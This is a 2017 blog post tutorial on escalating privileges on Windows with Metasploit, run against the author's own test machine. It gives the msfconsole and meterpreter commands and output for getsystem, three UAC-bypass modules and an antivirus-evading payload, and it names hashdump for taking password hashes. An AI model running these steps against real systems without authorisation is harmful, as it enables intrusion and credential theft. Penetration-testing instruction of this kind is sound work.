---
title: Privilege Escalation in Windows
subtitle: A Closer Look at Metasploit's Sweet Spots
date: 2017-05-14 00:00:00 Z
layout: post
comments: true
author: Alan
---

Dusting off `msfconsole` and the Metasploit framework itself, it was time for me to get back on my feet with penetration testing.

With the recent ransomware [WannaCry](http://www.cnn.com/2017/05/14/opinions/wannacrypt-attack-should-make-us-wanna-cry-about-vulnerability-urbelis/) spreading throughout the globe, I pondered upon the question on how malware is able to attain system-level privileges on a Windows machine, locking it down, and making it near-impossible to circumvent.

When utilizing Metasploit against Windows targets, its essential to escalate user privileges to __SYSTEM__, otherwise being stuck on a user account with regular permissions limit the pentest. As penetration testers, privilege escalation is considered the most critical point of the post-exploitation step, and all the hard work from gaining initial access, maintaining persistence and circumventing the anti-virus will all seem meaningless.

What are some fun things we can do once we attain __SYSTEM__?

* Attain passwords, including hashes for any accounts on the system ('hashdump')
* Change passwords, create users and change permissions (even administration)
* Pivot to other workstations

A lot of the higher system-level functions of Metasploit rely on gaining system. Many penetration testers work immediately at privilege escalation once the machine is pwn`ed.

Metasploit's `meterpreter` console comes with some built-in Ruby scripts that can already help with the process.

    msf exploit(ms08_067_netapi) > exploit
    ...
    meterpreter > getsystem

In this case, I utilized the built in `getsystem` script. Well, what __exactly__ does `getsystem` do? `getsystem` works on three different techniques. Although I won't go in detail about how they work, Cobalt Strike (a Metasploit GUI framework) wrote a [great blog post](https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/) about it.

This exploit, CVE-2008-4250, is one of the staples of vulnerabilities in the early Windows XP operating systems. Yes, Windows __XP__. What happens if we attempt to gain privileges on a pwn'ed Windows 8 or 10 machine?


    msf exploit(handler) > exploit
    ...
    meterpreter > getsystem
    [-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
    [-] Named Pipe Impersonation (In Memory/Admin)
    [-] Named Pipe Impersonation (Dropper/Admin)
    [-] Token Duplication (In Memory/Admin)

Using a standard Veil-Evasion encrypted Meterpreter payload binary, I gained physical access inside my test Windows 10 machine. Not as fun as fileless access, but gets the work done. However, when we attempt to utilize `getsystem` this time, all three methods of it ceased to work. Even doing `getprivs` doesn't yield us that many permissions.

    meterpreter > getprivs
    ============================================================
    Enabled Process Privileges
    ============================================================
    SeShutdownPrivilege
    SeChangeNotifyPrivilege
    SeUndockPrivilege

And keep in mind that this is a standard Windows 10 machine WITHOUT any AVs except for the standard Windows Defender. So, what happened?

## User Account Control

Now's a great time to talk about Window's UAC, or User Account Control feature. This feature was implemented as a security feature such that hackers are not able to gain privileges. This means that in order for a regular user to utilize some sort of service of application that is available exclusively to the administrator, a popup prompt will pop out requesting authentication as a Administrator. Sounds familiar? You definitely has seen UAC before, with all its warnings about unknown publishers for some applications, turning off certain features in the Windows settings, etc.

![uac](http://bit.ly/2qGTpjE)

On Windows 10, UAC has become much more stricter, such that impersonating SYSTEM with `getsystem` becomes much harder ... but not impossible. 

## A Few Methods to Bypass UAC

In order to circumvent this, we need to rely on some different techniques. 

### Windows Escalate UAC Protection Bypass

This is a method which spawns a new shell session with UAC disabled as a process. This attack works, however, on the basis that UAC is set as "Notify me only when programs try to make changes to my computer", which is standard for many operating systems.

 Let's background our current `meterpreter` session and load it up.

    meterpreter > background
    [*] Backgrounding session 2...
    msf(handler) > use exploit/windows/local/bypassuac
    msf(bypassuac) > show targets

    Exploit targets:

       Id  Name
       --  ----
       0   Windows x86
       1   Windows x64
    
    msf(bypassuac) > set TARGET 1
    TARGET => 1
    msf(bypassuac) > set SESSION 2
    SESSION => 2
    msf(bypassuac) > exploit
    ...

Once complete, we are able to `getsystem` as we did previously.

Of course, this may not totally work. If UAC is set to "Always Notify", loading this process as part of memory will fail. Therefore, if you use a build of Windows that is Vista it will not work, as this is feature is default. In this case, the attack against my Windows 10 build failed

    msf exploit(bypassuac) > exploit

    [*] Started reverse TCP handler on 192.168.1.170:4444 
    [-] Exploit aborted due to failure: not-vulnerable: Windows 10 (Build 14393). is not vulnerable.
    [*] Exploit completed, but no session was created.


### Windows Escalate UAC Protection Bypass (In Memory Injection)

This exploit aims to to inject a DLL binary through the Reflective DLL Injection technique. Similar to the previous exploit, it is important to specify the architecture of the machine.

    meterpreter > background
    [*] Backgrounding session 2...
    msf(handler) > use exploit/windows/local/bypassuac_injection
    msf(bypassuac_injection) > show targets

    Exploit targets:

       Id  Name
       --  ----
       0   Windows x86
       1   Windows x64

    msf(bypassuac_injection) > set TARGET 0
    TARGET => 0
    msf(bypassuac_injection) > set SESSION 2
    SESSION => 2
    msf(bypassuac_injection) > exploit
    ...

### Windows Escalate UAC Execute RunAs

This last exploit was actually from [this Metasploitation video](https://www.youtube.com/watch?v=OqmxRIqC3FE&feature=youtu.be) and was conceived by Hak5's [mubix](https://room362.com/). I find this privilege escalation method the most effective, but it does add on a caveat of the target user having to explicitly click on a UAC notification. This exploit calls upon the Windows `ShellExecute` function to start a shell with UAC-bypassed privileges. Once again, it is important that you set the necessary target architecture.

    meterpreter > background
    [*] Backgrounding session 2...
    msf(handler) > use exploit/windows/local/ask
    msf(ask) > show targets

    Exploit targets:

       Id  Name
       --  ----
       0   Windows x86
       1   Windows x64

    msf(ask) > set TARGET 0
    TARGET => 0
    msf(ask) > set SESSION 2
    SESSION => 2
    msf(ask) > exploit
    ...

Once executed, UAC will give a prompt to a user. Once completed, the exploit finishes, and you are able to `getsystem`.

---

Thanks for reading this article! Although I had fun getting my feet wet with Metasploit again, I still am reminded about how uninformed I am about the Win API, and really want to dive into binary exploitation, as well as acquainting myself with the Windows architecture for security-oriented purposes. With that said, expect some more fun stuff in the future combining both penetration testing and programming!

With that said, stay safe and good luck with your endeavors!